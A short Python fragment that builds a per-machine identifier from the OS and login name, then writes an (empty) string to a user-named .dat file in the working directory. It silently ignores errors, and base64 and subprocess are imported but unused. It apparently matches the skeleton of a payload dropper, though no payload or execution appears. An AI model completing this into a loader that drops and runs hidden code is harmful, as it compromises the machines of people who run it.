
import base64
import sys
import os
import subprocess
import random
import string
import platform

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str


struri = platform.system()[0] + os.getlogin() + '_' + get_random_string(6)
strsfx = "/"
if platform.system()[0] == 'W':
    strsfx = '\\'
pypathstr = sys.executable
pyexecstr = ''
strb = ''

if len(strb) > 0:
    try:
        pyexecstr = os.getcwd() + strsfx + platform.system()[0] + os.getlogin() + ".dat"
        f = open(pyexecstr, "w")
        f.write(strb)
        f.close()
    except:
        pass